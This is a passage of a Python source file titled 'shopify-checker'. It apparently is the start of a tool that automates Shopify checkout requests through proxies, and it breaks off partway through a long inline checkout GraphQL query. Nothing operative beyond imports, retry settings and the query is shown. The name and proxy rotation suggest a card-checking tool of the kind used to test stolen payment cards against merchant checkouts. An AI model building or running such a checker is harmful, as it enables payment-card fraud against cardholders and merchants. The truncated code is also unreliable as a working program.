"""
shopify-checker (reference-style, modern)
run: python api.py
deps: pip install "flask[async]" aiohttp aiohttp-socks
"""
import asyncio
import aiohttp
import json
import re
import random
import logging
import time
import threading
import os
import traceback
import sys
import uuid
from urllib.parse import urlparse, parse_qs
from decimal import Decimal
from flask import Flask, g, request, jsonify
from logging.handlers import RotatingFileHandler

try:
    from aiohttp_socks import ProxyConnector, ProxyType
    HAS_SOCKS = True
except ImportError:
    HAS_SOCKS = False


# =====================================================================
# RETRY CONFIG
# =====================================================================
FETCH_RETRIES = int(os.getenv("FETCH_RETRIES", "3"))
CART_RETRIES = int(os.getenv("CART_RETRIES", "3"))
RETRY_BACKOFF = float(os.getenv("RETRY_BACKOFF", "0.5"))


# =====================================================================
# GraphQL queries (inline)
# =====================================================================
QUERY_PROPOSAL_SHIPPING = """query Proposal($alternativePaymentCurrency:AlternativePaymentCurrencyInput,$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$checkpointData:String,$queueToken:String,$reduction:ReductionInput,$availableRedeemables:AvailableRedeemablesInput,$changesetTokens:[String!],$tip:TipTermInput,$note:NoteInput,$localizationExtension:LocalizationExtensionInput,$nonNegotiableTerms:NonNegotiableTermsInput,$scriptFingerprint:ScriptFingerprintInput,$transformerFingerprintV2:String,$optionalDuties:OptionalDutiesInput,$attribution:AttributionInput,$captcha:CaptchaInput,$poNumber:String,$saleAttributions:SaleAttributionsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{alternativePaymentCurrency:$alternativePaymentCurrency,delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,reduction:$reduction,availableRedeemables:$availableRedeemables,tip:$tip,note:$note,poNumber:$poNumber,nonNegotiableTerms:$nonNegotiableTerms,localizationExtension:$localizationExtension,scriptFingerprint:$scriptFingerprint,transformerFingerprintV2:$transformerFingerprintV2,optionalDuties:$optionalDuties,attribution:$attribution,captcha:$captcha,saleAttributions:$saleAttributions},checkpointData:$checkpointData,queueToken:$queueToken,changesetTokens:$changesetTokens}){__typename result{...on NegotiationResultAvailable{checkpointData queueToken buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on Throttled{pollAfter queueToken pollUrl __typename}...on NegotiationResultFailed{__typename}__typename}errors{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on GenericError{__typename}...on PendingTermViolation{__typename}__typename}}__typename}}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on MissingProductVariantMerchandise{__typename variantId}__typename}fragment SourceProvidedMerchandise on Merchandise{...on SourceProvidedMerchandise{__typename product{id title productType vendor __typename}productUrl digest variantId optionalIdentifier title untranslatedTitle subtitle untranslatedSubtitle taxable giftCard requiresShipping price{amount currencyCode __typename}deferredAmount{amount currencyCode __typename}image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}options{name value __typename}properties{...MerchandiseProperties __typename}taxCode taxesIncluded weight{value unit __typename}sku}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment ProductVariantMerchandiseDetails on ProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{id subscriptionDetails{billingInterval __typename}__typename}giftCard __typename}fragment ContextualizedProductVariantMerchandiseDetails on ContextualizedProductVariantMerchandise{id digest variantId title untranslatedTitle subtitle untranslatedSubtitle sku price{amount currencyCode __typename}product{id vendor productType __typename}productUrl image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}properties{...MerchandiseProperties __typename}requiresShipping options{name value __typename}sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}giftCard deferredAmount{amount currencyCode __typename}__typename}fragment LineAllocationDetails on LineAllocation{stableId quantity totalAmountBeforeReductions{amount currencyCode __typename}totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}unitPrice{price{amount currencyCode __typename}measurement{referenceUnit referenceValue __typename}__typename}allocations{...on LineComponentDiscountAllocation{allocation{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}__typename}__typename}__typename}fragment MerchandiseBundleLineComponent on MerchandiseBundleLineComponent{__typename stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment MerchandiseLineComponentWithCapabilities on MerchandiseLineComponentWithCapabilities{__typename stableId componentCapabilities componentSource merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name configurationParams __typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on FacebookPayWalletConfig{__typename name partnerId partnerMerchantId supportedContainers acquirerCountryCode mode paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on AmazonPayClassicWalletConfig{__typename name orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName additionalParameters{...on IdealBankSelectionParameterConfig{__typename label options{label value __typename}}__typename}orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired __typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{cvvSessionId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId __typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode 